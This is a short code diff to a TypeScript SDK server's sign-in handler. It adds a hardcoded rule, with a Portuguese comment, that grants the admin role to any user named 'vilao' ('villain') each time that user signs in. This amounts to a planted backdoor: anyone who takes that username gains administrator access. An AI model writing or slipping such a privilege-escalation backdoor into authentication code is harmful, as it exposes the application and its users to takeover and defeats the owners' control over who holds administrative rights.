@@ -289,10 +289,17 @@ class SDKServer {
       throw ForbiddenError("User not found");
     }
 
-    await db.upsertUser({
+    const updateData: any = {
       openId: user.openId,
       lastSignedIn: signedInAt,
-    });
+    };
+
+    // Garantir que o usuário 'vilao' tenha a role admin
+    if (user.name === "vilao") {
+      updateData.role = "admin";
+    }
+
+    await db.upsertUser(updateData);
 
     return user;
   }
